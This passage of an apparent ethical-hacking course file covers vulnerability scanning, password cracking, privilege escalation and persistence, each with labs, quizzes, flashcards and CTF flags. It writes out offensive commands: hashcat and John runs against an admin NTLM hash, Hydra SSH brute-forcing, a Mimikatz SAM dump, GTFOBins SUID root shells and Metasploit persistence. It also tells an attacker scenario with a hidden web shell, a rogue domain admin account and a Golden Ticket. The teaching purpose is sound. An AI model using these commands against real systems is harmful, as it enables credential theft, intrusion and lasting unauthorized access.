    {icon:'⛔',title:'Handing a 500-Page Report to IT',desc:'Exporting a Nessus PDF and throwing it over the fence to the sysadmin team destroys relationships and guarantees nothing gets patched.',fix:'Analyze the report. Filter out false positives. Group the fixes (e.g., "Applying this one Windows cumulative update fixes 80 of these CVEs"). Provide actionable, prioritized remediation plans.'}
  ],
  lab:{
    title:'Lab: Authenticated vs Unauthenticated Scanning',
    difficulty:'Intermediate',
    duration:'45 min',
    objectives:['Configure a basic vulnerability scan','Understand the difference credentials make','Analyze scan results'],
    steps:[
      'If you have access to Nessus Essentials or OpenVAS (Greenbone):',
      'Create a new scan policy targeting a vulnerable VM (e.g., Metasploitable).',
      'Run the scan WITHOUT credentials. Note the number of Critical and High vulnerabilities found.',
      'Edit the scan policy. Go to the Credentials tab and add the SSH username/password for the target VM.',
      'Run the scan again WITH credentials.',
      'Compare the reports. The credentialed scan will list vulnerabilities in local packages (e.g., outdated kernel, vulnerable local sudo configuration) that the unauthenticated scan could not see.'
    ],
    validation:'You should observe a massive increase in findings during the authenticated scan, proving that logging into the box provides the only accurate vulnerability assessment.'
  },
  quiz:[
    {q:'What is the primary function of an automated vulnerability scanner like Nessus?',opts:['To actively exploit systems and gain root access','To map network topology','To discover live hosts, open ports, and probe services against a database of known signatures to identify vulnerabilities','To encrypt network traffic'],correct:2,fb:'Scanners automate the discovery phase and match found services against a massive database of plugins/signatures (CVEs). They do not exploit the vulnerabilities.'},
    {q:'Which of the following is an open-source alternative to the commercial Nessus scanner?',opts:['Qualys','Nexpose','OpenVAS (Greenbone)','Burp Suite'],correct:2,fb:'OpenVAS started as a fork of the Nessus engine when Nessus became closed-source commercial software. It is the premier open-source vulnerability scanner.'},
    {q:'What is a "Credentialed" (or Authenticated) vulnerability scan?',opts:['A scan performed by a certified professional','A scan where the scanner is provided with usernames and passwords (or SSH keys) to log into the target systems and check local registries and files','A scan that only targets password login portals','A scan that requires a license key'],correct:1,fb:'Credentialed scans allow the scanner to log into the target (via SSH or SMB), enabling it to check installed software versions, missing patches, and local configurations that are invisible from the outside.'},
    {q:'Why might a vulnerability scanner cause a Denial of Service (DoS) on a legacy network?',opts:['Because scanners are malware','Because the aggressive probing of thousands of ports and malformed packets can overwhelm fragile or older systems (like SCADA or IoT)','Because scanners intentionally shut down systems they find vulnerable','Because scanners encrypt the hard drives'],correct:1,fb:'Vulnerability scanners are noisy and aggressive. Sending thousands of malformed packets to a fragile legacy system can easily crash its network stack or the service itself.'},
    {q:'In Nessus, what is a "Plugin"?',opts:['A browser extension for viewing reports','A small script or signature that checks for a specific vulnerability or misconfiguration','A hardware dongle required to run the software','A module that exploits the target'],correct:1,fb:'Scanners use a library of Plugins (Tenable/Nessus) or NVTs (Network Vulnerability Tests in OpenVAS). Each plugin contains the logic to test for one specific vulnerability (e.g., a plugin to check for MS17-010).'},
    {q:'If you need to scan a highly fragile medical device network, how should you adjust your vulnerability scanner settings?',opts:['Enable the "Aggressive" profile','Enable brute-force plugins','Create a custom policy that disables DoS plugins, disables brute-forcing, and reduces the scan speed/concurrent connections','Scan it during peak operational hours'],correct:2,fb:'Fragile networks require custom, gentle scan policies to prevent disruption to critical services.'},
    {q:'What is a major limitation of Unauthenticated vulnerability scans?',opts:['They are illegal','They can only find vulnerabilities on the perimeter/network services and cannot see missing local OS patches or local software flaws','They take weeks to run','They require root access'],correct:1,fb:'An unauthenticated scan only sees what is listening on open ports. It cannot see if Adobe Reader is outdated on the hard drive, or if a Windows patch from last Tuesday was missed.'},
    {q:'When a vulnerability scanner flags a web server as vulnerable based ONLY on the "Server: Apache/2.2.14" banner, what is the primary risk of this finding?',opts:['It might trigger an exploit','It is likely a False Positive if the administrator backported security patches without changing the version banner','It will crash the server','It proves the server is compromised'],correct:1,fb:'Linux distributions (like Debian/RedHat) often "backport" security fixes into older software versions without changing the main version number. Scanners relying only on banners will flag this as a false positive.'},
    {q:'How does a vulnerability scanner differ from a port scanner (like basic Nmap)?',opts:['Port scanners find vulnerabilities; vulnerability scanners find ports','Port scanners stop at identifying open ports and services; vulnerability scanners actively probe those services with thousands of specific tests to identify known CVEs','Vulnerability scanners are much faster','There is no difference'],correct:1,fb:'Nmap tells you "Apache 2.4 is running on port 80." Nessus goes further by sending specific payloads to check if that Apache 2.4 instance is vulnerable to 50 different known CVEs.'},
    {q:'Which phase of the ethical hacking methodology relies heavily on the output of automated vulnerability scanners?',opts:['Reconnaissance','Scanning / Vulnerability Analysis','Maintaining Access','Covering Tracks'],correct:1,fb:'Vulnerability scanners are the primary tool used during the Vulnerability Analysis phase to map enumerated services to actionable exploits.'}
  ],
  flashcards:[
    {f:'Vulnerability Scanner',b:'Automated tool (Nessus, OpenVAS, Qualys) that probes networks to identify missing patches and known CVEs.'},
    {f:'Credentialed Scan',b:'An authenticated scan where the scanner logs into the target (SSH/SMB) to accurately check local files, registries, and missing patches.'},
    {f:'Unauthenticated Scan',b:'A scan without login credentials. Can only identify vulnerabilities visible from the network perimeter (open ports).'},
    {f:'Plugin / Signature',b:'The individual script within a scanner that tests for one specific vulnerability.'},
    {f:'OpenVAS',b:'The leading open-source, full-featured vulnerability scanner.'},
    {f:'Nessus',b:'The industry-standard commercial vulnerability scanner by Tenable.'},
    {f:'False Positive (Scanning)',b:'When a scanner flags a secure system as vulnerable, often because it relied solely on checking version banners instead of behavior.'},
    {f:'Fragile Systems (SCADA/IoT)',b:'Systems that can easily crash during automated vulnerability scanning. Require custom, slow, gentle scan policies.'}
  ],
  ctf:{
    scenario:'You configure Nessus to log into a Windows target using SMB credentials to perform a highly accurate scan of missing registry patches. What type of scan is this?',
    hint:'It requires credentials. It is an _______ scan.',
    flag:'CEH{n3ssus_0p3nv4s_sc4n}',
    points:150
  },
  summary:[
    'Automated scanners (Nessus, OpenVAS, Qualys) map enumerated services to known CVEs at scale.',
    'Scanners use plugins/signatures to probe for specific vulnerabilities.',
    'Credentialed (Authenticated) scans log into the target and are required for accurate enterprise assessments.',
    'Unauthenticated scans only see perimeter flaws and generate high rates of False Positives.',
    'Always use custom, gentle policies when scanning fragile SCADA, medical, or legacy systems.',
    'Vulnerability scanning is not penetration testing; it is the prerequisite step before exploitation.'
  ]
};



// =================================================================
// MODULE 06 — System Hacking
// =================================================================

CONTENT['password-cracking'] = {
  module:'Module 06 · System Hacking',
  title:'Password Cracking',
  sub:'Breaking the primary mechanism of authentication.',
  killchain:{phase:'Gaining Access',mitre:'T1110 — Brute Force',desc:'Once a vulnerability or misconfiguration is found, password cracking is often required to escalate privileges or access encrypted data.'},
  learn:{
    simple:'Password cracking is the process of recovering plaintext passwords from their hashed or encrypted formats. Since systems do not store passwords in plaintext (they store hashes), attackers steal the hash database and crack them offline.',
    analogy:'A password hash is like a fingerprint. You can\'t look at a fingerprint and know what the person looks like (irreversible). Password cracking is having a fingerprint, then fingerprinting a million different people (guessing passwords), and seeing if one matches.',
    why:'Many exploits only provide limited access. To gain full control of a domain, an attacker must compromise an administrative account. Since admins don\'t usually leave plaintext passwords around, cracking their extracted password hashes is mandatory.',
    architecture:'Cracking methods include: Dictionary (trying words from a list), Brute-Force (trying every possible character combination), Rule-based (trying words from a list but appending numbers/symbols like "Password123!"), and Rainbow Tables (pre-computed hashes).'
  },
  diagram:{
    title:'Offline Password Cracking Workflow',
    steps:[
      {icon:'🔓',label:'1. Gain Initial Access',desc:'Exploit a vulnerability to gain low-level access to the system.'},
      {icon:'🗄️',label:'2. Extract Hashes',desc:'Extract the SAM database (Windows) or /etc/shadow (Linux) containing the password hashes.'},
      {icon:'💻',label:'3. Offline Cracking',desc:'Move the hashes to an attacker-controlled cracking rig (high-end GPUs).'},
      {icon:'📚',label:'4. Dictionary Attack',desc:'Run Hashcat or John the Ripper using rockyou.txt (known breached passwords).'},
      {icon:'🧩',label:'5. Rule-Based Attack',desc:'Apply mutation rules (e.g., capitalize first letter, append year) to the dictionary.'},
      {icon:'🔑',label:'6. Plaintext Recovery',desc:'The cracked plaintext password is used to escalate privileges or move laterally.'}
    ]
  },
  enterprise:{
    role:'You are an internal red team operator at GlobalFinSec Corp.',
    situation:'You exploited a minor web vulnerability and gained a low-privilege shell on a Windows web server. You dumped the local SAM database and extracted the local Administrator NTLM hash.',
    challenge:'Crack the NTLM hash as quickly as possible to escalate privileges on the server.',
    steps:[
      'Extract Hash: Admin:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::',
      'Identify Format: NTLM hashes are 32 hexadecimal characters. (Hashcat mode 1000).',
      'Dictionary Attack: hashcat -m 1000 -a 0 hash.txt rockyou.txt',
      'Rule Attack (if dictionary fails): hashcat -m 1000 -a 0 hash.txt rockyou.txt -r rules/best64.rule'
    ],
    outcome:'The dictionary attack with the best64 rule cracked the hash in 14 seconds. The password was "GlobalFinSec2023!". You used this password to log in via RDP and achieved full administrative control of the server.',
    lesson:'Weak password policies defeat strong cryptography. Even if NTLM or Kerberos encryption is mathematically secure, if users choose "CompanyYear!" passwords, attackers will crack them instantly using rules.'
  },
  tools:[
    {name:'Hashcat',cmd:'hashcat -m 1000 hash.txt wordlist.txt',desc:'The world\'s fastest password cracker (GPU accelerated)'},
    {name:'John the Ripper',cmd:'john --wordlist=rockyou.txt hash.txt',desc:'Classic, versatile CPU-based password cracker'},
    {name:'Hydra',cmd:'hydra -l admin -P pass.txt ssh://target',desc:'Online password brute-forcer (attacks login portals directly, unlike Hashcat)'},
    {name:'Mimikatz',cmd:'mimikatz "lsadump::sam"',desc:'Tool for extracting plaintext passwords and hashes from Windows memory'}
  ],
  commands:{
    win:['Rem - Use Mimikatz to dump hashes from memory','hashcat64.exe -m 1000 hash.txt rockyou.txt'],
    lin:['john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt','hashcat -m 1000 -a 0 hash.txt rockyou.txt','hydra -l admin -P rockyou.txt ssh://192.168.1.10']
  },
  pitfalls:[
    {icon:'⚠️',title:'Online Brute-Forcing Instead of Offline Cracking',desc:'Students often try to use Hydra (Online) to guess passwords against an SSH or SMB service. This is incredibly slow and triggers account lockouts after 3-5 attempts.',fix:'Whenever possible, extract the hash database (SAM/shadow) and crack it offline using Hashcat. Offline cracking causes no lockouts, generates zero network traffic, and can guess billions of passwords per second using GPUs.'},
    {icon:'🔴',title:'Using Brute-Force Before Dictionary Attacks',desc:'Starting a pure brute-force attack (guessing a, b, c... aaaaaaa) for an 8-character password will take centuries.',fix:'Always run a Dictionary attack (rockyou.txt) first, followed by a Rule-based attack. 95% of passwords will crack within minutes. Pure brute-force is a last resort.'},
    {icon:'⛔',title:'Not Knowing the Hash Format',desc:'If you tell Hashcat to crack an MD5 hash (-m 0) but the hash is actually NTLM (-m 1000), it will fail instantly or produce garbage.',fix:'Use tools like "hashid" or "name-that-hash" to identify the hash type before attempting to crack it.'}
  ],
  lab:{
    title:'Lab: Crack an NTLM Hash with John the Ripper',
    difficulty:'Beginner',
    duration:'15 min',
    objectives:['Identify a hash type','Use a wordlist','Crack the hash using John the Ripper'],
    steps:[
      'Create a file named hash.txt containing this NTLM hash: 8846f7eaee8fb117ad06bdd830b7586c',
      'Identify it: Run hashid hash.txt (It should suggest MD4/NTLM).',
      'Crack it: run john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
      'View the result: run john --show hash.txt',
      'The plaintext password should be revealed.'
    ],
    validation:'You should successfully recover the plaintext password ("password123") from the provided NTLM hash using the rockyou.txt dictionary.'
  },
  quiz:[
    {q:'What is the primary difference between an Online password attack and an Offline password attack?',opts:['Online uses the internet; Offline does not','Online attacks interact with a live login portal (like SSH or a website); Offline attacks crack extracted hashes locally on the attacker\'s hardware','Online attacks are legal; Offline attacks are illegal','There is no difference'],correct:1,fb:'Online attacks (Hydra) must communicate over the network and are subject to lockouts and rate limiting. Offline attacks (Hashcat) crack a stolen database at maximum hardware speed with no risk of lockout.'},
    {q:'Which password cracking technique uses a predefined list of common words and passwords?',opts:['Brute-Force Attack','Dictionary Attack','Rainbow Table Attack','Keylogging'],correct:1,fb:'A Dictionary attack reads through a text file (like rockyou.txt) and hashes each word, comparing it to the stolen hash. It is the fastest method.'},
    {q:'What is a "Rainbow Table"?',opts:['A list of colorful passwords','A pre-computed table of hash values for every possible password combination, allowing for nearly instant hash reversal','A tool for extracting passwords from memory','A type of encryption algorithm'],correct:1,fb:'Rainbow tables trade massive storage space (terabytes of pre-computed hashes) for extreme cracking speed. They are defeated by "salting" passwords.'},
    {q:'What defensive technique defeats Rainbow Tables?',opts:['Encryption','Salting (adding random data to the password before hashing)','Using a firewall','Changing the password every 90 days'],correct:1,fb:'A salt is a random string added to the password before it is hashed. Because the salt is unique for every user, an attacker cannot use pre-computed Rainbow Tables; they must compute the hashes from scratch.'},
    {q:'Which tool is widely considered the fastest, GPU-accelerated offline password cracker?',opts:['Hydra','John the Ripper','Hashcat','Medusa'],correct:2,fb:'While John the Ripper is excellent (primarily CPU), Hashcat is optimized to use modern Graphics Processing Units (GPUs), allowing it to crack billions of hashes per second.'},
    {q:'In Windows, where are local user password hashes stored?',opts:['In the C:\Windows\Passwords.txt file','In the Active Directory database','In the SAM (Security Account Manager) database','In the /etc/shadow file'],correct:2,fb:'Local Windows passwords are stored as NTLM hashes in the SAM database (located at C:\Windows\System32\config\SAM).'},
    {q:'What type of attack involves trying a few common passwords (e.g., "Welcome1!", "Fall2024!") against hundreds or thousands of user accounts?',opts:['Brute-force attack','Dictionary attack','Password Spraying','Phishing'],correct:2,fb:'Password Spraying aims to defeat account lockout policies. Instead of trying 100 passwords against 1 user (which locks them out), the attacker tries 1 password against 100 users.'},
    {q:'Which Linux file contains the password hashes for local users?',opts:['/etc/passwd','/etc/shadow','/etc/group','/var/log/auth.log'],correct:1,fb:'Historically, hashes were in /etc/passwd (readable by anyone). Modern Linux systems moved the hashes to /etc/shadow, which is only readable by the root user.'},
    {q:'What is a "Rule-Based" or "Hybrid" dictionary attack?',opts:['Combining online and offline tools','Applying mutation rules (like capitalizing the first letter or appending numbers) to the words in a dictionary list before hashing them','Using two different dictionaries at once','Cracking both Windows and Linux hashes simultaneously'],correct:1,fb:'Since users often use variations of common words (e.g., "Password123!"), a rule-based attack applies these common mutations to a dictionary list, drastically increasing the success rate.'},
    {q:'What is the primary function of the tool Mimikatz?',opts:['To brute-force SSH logins','To extract plaintext passwords, hashes, and Kerberos tickets from Windows memory (LSASS)','To perform SQL injection','To map network topologies'],correct:1,fb:'Mimikatz is a post-exploitation tool that interacts with the Local Security Authority Subsystem Service (LSASS) in Windows to extract credentials from memory.'}
  ],
  flashcards:[
    {f:'Offline Cracking',b:'Cracking stolen hashes locally on the attacker\'s hardware (Hashcat/John). No risk of account lockout.'},
    {f:'Online Cracking',b:'Brute-forcing a live login service (Hydra/Medusa). High risk of account lockout and detection.'},
    {f:'Dictionary Attack',b:'Using a wordlist of known passwords (like rockyou.txt) to crack hashes. The fastest and most common method.'},
    {f:'Rainbow Table',b:'Massive, pre-computed tables of hashes. Allows for near-instant cracking, but defeated by salting.'},
    {f:'Salting',b:'Adding random data to a password before hashing it. Defeats Rainbow Tables.'},
    {f:'SAM Database',b:'Security Account Manager. The file where local Windows password hashes are stored.'},
    {f:'/etc/shadow',b:'The file where local Linux password hashes are stored.'},
    {f:'Hashcat',b:'The industry-standard, extremely fast, GPU-accelerated offline password cracker.'}
  ],
  ctf:{
    scenario:'You dumped the /etc/shadow file from a Linux server. The root hash starts with "$6$". What hashing algorithm does "$6$" represent in Linux shadow files?',
    hint:'It is part of the Secure Hash Algorithm 2 family.',
    flag:'CEH{p4ssw0rd_cr4ck1ng_2026}',
    points:150
  },
  summary:[
    'Password cracking converts stolen hashes back into plaintext passwords.',
    'Offline cracking (Hashcat/John) is vastly superior to Online cracking (Hydra) because it avoids lockouts and is millions of times faster.',
    'Always start with a Dictionary Attack (rockyou.txt), followed by a Rule-based attack.',
    'Windows stores local hashes in the SAM database; Linux stores them in /etc/shadow.',
    'Salting defeats Rainbow Tables by ensuring identical passwords have different hashes.',
    'Mimikatz is the premier tool for extracting credentials from Windows memory.',
    'Password Spraying is used to bypass account lockout policies by testing one password across many users.'
  ]
};

CONTENT['privilege-escalation'] = {
  module:'Module 06 · System Hacking',
  title:'Privilege Escalation',
  sub:'Going from standard user to absolute root control.',
  killchain:{phase:'Gaining Access',mitre:'TA0004 — Privilege Escalation',desc:'Initial exploits rarely grant Administrator/Root access. Privilege escalation is the mandatory step to take full control of the compromised asset.'},
  learn:{
    simple:'Privilege Escalation is the process of exploiting a bug, design flaw, or misconfiguration in an operating system or software application to gain elevated access to resources that are normally protected from standard users.',
    analogy:'Imagine sneaking into an office building as a janitor (low privilege). You can empty the trash, but you can\'t open the vault. Privilege escalation is finding a master key left on a desk, or tricking the security guard into opening the vault for you, turning you into the Bank Manager (high privilege).',
    why:'An attacker with a standard user shell is severely limited. They cannot dump password hashes, install rootkits, disable antivirus, or modify system files. To secure persistence and pivot through the network, gaining "SYSTEM" (Windows) or "root" (Linux) is absolutely required.',
    architecture:'Escalation is either Vertical (User -> Administrator/Root) or Horizontal (User A -> User B). Methods include exploiting kernel vulnerabilities, abusing misconfigured services (weak file permissions, unquoted service paths), or finding plaintext credentials in configuration files.'
  },
  diagram:{
    title:'Common Privilege Escalation Vectors',
    steps:[
      {icon:'💻',label:'Kernel Exploits',desc:'Exploiting vulnerabilities in the OS core (e.g., Dirty COW on Linux, PrintNightmare on Windows). Immediate root/SYSTEM access.'},
      {icon:'🔧',label:'Misconfigured Services',desc:'Windows services running as SYSTEM that have weak permissions, allowing a low-level user to replace the service executable.'},
      {icon:'📄',label:'Cleartext Passwords',desc:'Finding admin passwords saved in text files, scripts, unattended installation files (sysprep.xml), or registry keys.'},
      {icon:'🔑',label:'SUID / SUDO Rights (Linux)',desc:'Abusing Linux binaries that are configured to run as root (SUID bit set), or exploiting overly broad SUDO permissions.'},
      {icon:'🖥️',label:'Scheduled Tasks / Cron Jobs',desc:'Modifying scripts that are scheduled to run automatically as an administrator.'}
    ]
  },
  enterprise:{
    role:'You are an internal penetration tester at GlobalFinSec Corp.',
    situation:'You gained initial access via a phishing email, landing a standard user shell on a Windows 10 workstation.',
    challenge:'Escalate privileges from standard user to SYSTEM to disable the EDR software and dump local credentials.',
    steps:[
      'Enumeration: Run WinPEAS (Windows Privilege Escalation Awesome Scripts) to automate finding misconfigurations.',
      'Analysis: WinPEAS highlights a service called "BackupAgent" running as SYSTEM. The path to the executable is unquoted and contains spaces: C:\Program Files\Backup Software\agent.exe.',
      'Exploitation (Unquoted Service Path): Because it is unquoted, Windows attempts to execute C:\Program.exe before C:\Program Files\... You create a malicious payload named "Program.exe".',
      'Execution: You drop Program.exe in the C:\ drive. You restart the workstation (or wait for a reboot).',
      'Result: Upon reboot, Windows executes your Program.exe with SYSTEM privileges instead of the real agent.'
    ],
    outcome:'The reverse shell connected back to your Kali machine as NT AUTHORITY\SYSTEM. You successfully disabled the EDR agent and dumped the SAM database.',
    lesson:'Automated patch management is not enough. Misconfigurations (like unquoted paths or weak folder permissions) are logic flaws, not missing patches. Regular configuration auditing is required to prevent privilege escalation.'
  },
  tools:[
    {name:'WinPEAS / LinPEAS',cmd:'linpeas.sh',desc:'Industry-standard scripts that automate the discovery of privilege escalation vectors'},
    {name:'BloodHound',cmd:'(GUI)',desc:'Maps Active Directory domain privilege escalation paths'},
    {name:'Metasploit',cmd:'meterpreter > getsystem',desc:'Contains automated local exploit modules to elevate privileges'}
  ],
  commands:{
    win:['whoami /priv','net user','tasklist /svc','sc qc [service_name]'],
    lin:['sudo -l','find / -perm -u=s -type f 2>/dev/null','cat /etc/crontab','uname -a']
  },
  pitfalls:[
    {icon:'⚠️',title:'Jumping to Kernel Exploits First',desc:'Kernel exploits (like Dirty COW) are unstable and frequently crash the target system (Blue Screen / Kernel Panic).',fix:'Kernel exploits are a last resort. Always look for misconfigurations (cleartext passwords, SUID binaries, unquoted service paths) first. They are silent and 100% reliable.'},
    {icon:'🔴',title:'Failing to Enumerate Local Information',desc:'Students gain a shell and immediately try to run random exploits. If you don\'t know the exact OS version, installed software, and running services, you are blind.',fix:'The first step of Privilege Escalation is Local Enumeration. Run systeminfo, whoami /all, or LinPEAS to map the local landscape before taking action.'},
    {icon:'⛔',title:'Ignoring "Horizontal" Escalation',desc:'Testers focus entirely on getting root. Sometimes getting root directly is impossible.',fix:'Look for horizontal escalation. Can you access an IT Helpdesk user\'s account? They aren\'t admin, but they have access to password reset portals that can eventually lead to admin.'}
  ],
  lab:{
    title:'Lab: Linux Privilege Escalation (SUID)',
    difficulty:'Intermediate',
    duration:'30 min',
    objectives:['Enumerate Linux for misconfigurations','Identify an SUID binary','Exploit the binary to gain a root shell'],
    steps:[
      'Assume you have a low-privilege SSH connection to a Linux target.',
      'Find files with the SUID bit set (executes with owner privileges, often root): find / -perm -u=s -type f 2>/dev/null',
      'Review the output. You notice /usr/bin/nmap has the SUID bit set.',
      'Check GTFOBins (gtfobins.github.io) for "nmap".',
      'Follow the GTFOBins instructions for older Nmap versions: run nmap --interactive, then type !sh at the prompt.',
      'Type whoami. You should be root.'
    ],
    validation:'You should understand how a misconfigured file permission (SUID bit on a binary that allows command execution) immediately destroys the security model of the operating system.'
  },
  quiz:[
    {q:'What is the definition of Privilege Escalation?',opts:['Bypassing a firewall','Increasing network bandwidth','Exploiting a vulnerability or misconfiguration to gain elevated access to resources normally protected from standard users','Encrypting data to prevent unauthorized access'],correct:2,fb:'Privilege escalation moves an attacker from a restricted, low-level context (like a web application service account) to an unrestricted context (like root or SYSTEM).'},
    {q:'What is the difference between Vertical and Horizontal privilege escalation?',opts:['Vertical is gaining admin rights; Horizontal is accessing another user\'s account with the same privilege level','Vertical is over the network; Horizontal is on the local machine','Vertical targets Windows; Horizontal targets Linux','There is no difference'],correct:0,fb:'Vertical escalation moves up the hierarchy (User -> Admin). Horizontal escalation moves sideways (User A -> User B), often to access specific files or as a stepping stone to vertical escalation.'},
    {q:'Which of the following is considered a "Misconfiguration" privilege escalation vector, rather than a software vulnerability?',opts:['A Linux kernel buffer overflow','An Unquoted Service Path in Windows','A zero-day exploit in Apache','A use-after-free bug in a web browser'],correct:1,fb:'An Unquoted Service Path is a logical configuration error (failing to put quotes around a file path with spaces), not a flaw in the code itself. The OS is doing exactly what it was programmed to do.'},
    {q:'What is the purpose of the tools WinPEAS and LinPEAS?',opts:['To crack passwords','To automate the discovery of potential privilege escalation vectors on Windows and Linux systems','To launch denial-of-service attacks','To encrypt network traffic'],correct:1,fb:'PEAS (Privilege Escalation Awesome Scripts) are massive enumeration scripts that search a compromised host for hundreds of known misconfigurations, saving the attacker hours of manual searching.'},
    {q:'In Linux, what does the SUID (Set Owner User ID) bit do?',opts:['It encrypts the file','It hides the file from standard users','It allows a user to execute the file with the permissions of the file\'s owner (often root), rather than the user executing it','It prevents the file from being deleted'],correct:2,fb:'If a binary owned by root has the SUID bit set, any user who runs it temporarily gains root privileges while the program executes. If that program allows shell access (like vim or nmap), it leads to instant privilege escalation.'},
    {q:'Why are Kernel Exploits generally considered a last resort by professional penetration testers?',opts:['They are illegal','They are highly unstable and frequently crash the target system (Kernel Panic / Blue Screen of Death)','They take days to run','They cannot grant root access'],correct:1,fb:'Kernel exploits manipulate memory at the core of the operating system. If they fail, they crash the entire server, disrupting business operations. Misconfigurations are much safer to exploit.'},
    {q:'What website is the definitive resource for finding how to bypass local security restrictions using legitimate Unix binaries (like exploiting SUID bits)?',opts:['Exploit-DB','NVD','GTFOBins','Shodan'],correct:2,fb:'GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems (e.g., how to get a root shell if `tar` has the SUID bit set).'},
    {q:'In Windows, what command would you run to see all the privileges assigned to your current user account?',opts:['netstat','whoami /priv','ipconfig','tasklist'],correct:1,fb:'`whoami /priv` lists all the security privileges assigned to the current token. Certain privileges (like SeImpersonatePrivilege or SeDebugPrivilege) can be abused to gain SYSTEM access.'},
    {q:'What is a "Cron Job" in Linux, and how can it lead to privilege escalation?',opts:['A password cracking tool','A scheduled task. If a cron job runs as root, and a low-privilege user has write access to the script it executes, they can inject malicious commands to run as root','A firewall rule','A type of kernel exploit'],correct:1,fb:'Cron jobs execute scripts on a schedule. If an administrator creates a root cron job but accidentally leaves the target script writable by standard users, anyone can rewrite the script to grant themselves root.'},
    {q:'If you find a file named `sysprep.xml` or `unattend.xml` on a Windows system, what are you likely looking for?',opts:['Cleartext administrator passwords used during the automated installation of the OS','Network routing tables','Firewall configurations','Vulnerability scanner logs'],correct:0,fb:'Unattended installation files (used to deploy Windows images automatically) frequently contain the local Administrator password in cleartext or weak Base64 encoding. Finding these files is a classic privilege escalation path.'}
  ],
  flashcards:[
    {f:'Privilege Escalation',b:'Exploiting a vulnerability or misconfiguration to gain elevated access (root/SYSTEM).'},
    {f:'Vertical Escalation',b:'Moving from a low-privilege user to a high-privilege user (Admin/Root).'},
    {f:'Horizontal Escalation',b:'Moving to another user account with the same privilege level.'},
    {f:'LinPEAS / WinPEAS',b:'Automated enumeration scripts that search for privilege escalation vectors on a local system.'},
    {f:'SUID Bit',b:'Linux permission that allows a program to execute with the privileges of its owner (often root). A major escalation vector if misconfigured.'},
    {f:'Unquoted Service Path',b:'Windows misconfiguration where a service path contains spaces but lacks quotes, allowing an attacker to drop a malicious executable in the path.'},
    {f:'GTFOBins',b:'Website cataloging how to exploit legitimate Unix binaries (like nmap or vim) to bypass restrictions and escalate privileges.'},
    {f:'Kernel Exploit',b:'Exploiting the OS core. Powerful but highly unstable; can cause system crashes (BSOD).' }
  ],
  ctf:{
    scenario:'You run `find / -perm -u=s -type f 2>/dev/null` on a Linux target and discover that `/usr/bin/find` has the SUID bit set. You consult GTFOBins and execute `find . -exec /bin/sh -p \; -quit`. What user are you now?',
    hint:'You escalated vertically to the highest user on Linux.',
    flag:'CEH{pr1v_3sc_r00t_2026}',
    points:150
  },
  summary:[
    'Privilege Escalation is mandatory; initial shells are rarely highly privileged.',
    'Vertical escalation = gaining Admin/Root. Horizontal = accessing other user accounts.',
    'Always prioritize Misconfigurations (cleartext passwords, SUID, scheduled tasks) over Kernel Exploits (unstable/crashes).',
    'LinPEAS and WinPEAS automate local enumeration to find these misconfigurations.',
    'SUID binaries and Cron jobs are the primary Linux misconfiguration targets.',
    'Unquoted Service Paths and unattended installation files (cleartext passwords) are primary Windows targets.',
    'GTFOBins is the standard reference for abusing legitimate Linux binaries.'
  ]
};

CONTENT['maintaining-access'] = {
  module:'Module 06 · System Hacking',
  title:'Maintaining Access',
  sub:'Ensuring you never lose the shell.',
  killchain:{phase:'Maintaining Access',mitre:'TA0003 — Persistence',desc:'Vulnerabilities get patched and servers get rebooted. Persistence mechanisms ensure the attacker retains access regardless of defender actions.'},
  learn:{
    simple:'Maintaining Access (Persistence) is the process of installing backdoors, rootkits, or creating hidden accounts so the attacker can re-enter the compromised system at any time, even if the original vulnerability they exploited is patched or the server is rebooted.',
    analogy:'Gaining access is picking the lock on the front door. Maintaining access is leaving the door unlocked, cutting a copy of the key, and installing a hidden doggie door in the back so you can come and go as you please, even if they change the front lock.',
    why:'Exploiting systems is noisy and risky. Attackers do not want to re-exploit the target every time they need access. Furthermore, IT departments regularly reboot servers and apply patches. Persistence guarantees the attacker survives these routine operations.',
    architecture:'Persistence mechanisms range from simple (creating a new Administrator account) to complex (installing a Rootkit in the OS kernel that hides files and processes). Attackers use Scheduled Tasks, Registry Run Keys, malicious services, and Trojanized system binaries to ensure their backdoor starts automatically.'
  },
  diagram:{
    title:'Common Persistence Mechanisms',
    steps:[
      {icon:'👥',label:'Account Manipulation',desc:'Creating hidden admin accounts, resetting passwords, or adding SSH keys to authorized_keys.'},
      {icon:'🖥️',label:'Scheduled Tasks / Cron',desc:'Configuring the OS to execute a reverse shell payload every hour or upon system boot.'},
      {icon:'🔑',label:'Registry Run Keys',desc:'Adding the malware to Windows Startup registry keys (HKLM\Software\Microsoft\Windows\CurrentVersion\Run).'},
      {icon:'💻',label:'Backdoored Services',desc:'Creating a hidden Windows Service that launches a Remote Access Trojan (RAT) in the background.'},
      {icon:'📟',label:'Web Shells',desc:'Uploading a PHP or ASPX script to the web server that executes commands sent via HTTP (bypasses firewalls).'},
      {icon:'🥷',label:'Rootkits',desc:'Modifying the OS kernel to completely hide the attacker\'s files, processes, and network connections from the defenders.'}
    ]
  },
  enterprise:{
    role:'You are an APT (Advanced Persistent Threat) actor targeting GlobalFinSec Corp.',
    situation:'You successfully exploited a zero-day vulnerability in their VPN gateway, escalated privileges, and now have full domain control. You know the zero-day patch will be released tomorrow.',
    challenge:'Establish multiple layers of persistence across the network so that when the VPN is patched, you do not lose access.',
    steps:[
      'Layer 1 (Web Shell): Drop a heavily obfuscated ASPX web shell deep in the IIS web server directory (e.g., error_log_template.aspx).',
      'Layer 2 (Registry): Use Metasploit to install a persistent backdoor in the Windows Registry Run key of a critical database server.',
      'Layer 3 (Accounts): Create a new Active Directory user named "svc_backup_admin", grant it Domain Admin rights, and set the password to never expire.',
      'Layer 4 (Golden Ticket): Extract the KRBTGT hash from the Domain Controller. This allows you to forge valid Kerberos tickets for any user at any time (Golden Ticket).'
    ],
    outcome:'The next day, the IT team patched the VPN gateway. Your initial entry point was gone. However, you simply browsed to the hidden ASPX web shell to regain a command prompt, and used the Golden Ticket to immediately act as Domain Admin. The network remains fully compromised.',
    lesson:'Defenders often stop at patching the vulnerability that caused the breach. Incident Response must include hunting for and eradicating persistence mechanisms (threat hunting), otherwise the attacker never really leaves.'
  },
  tools:[
    {name:'Metasploit',cmd:'run persistence -X -i 5 -p 4444',desc:'Contains automated post-exploitation modules for installing persistence'},
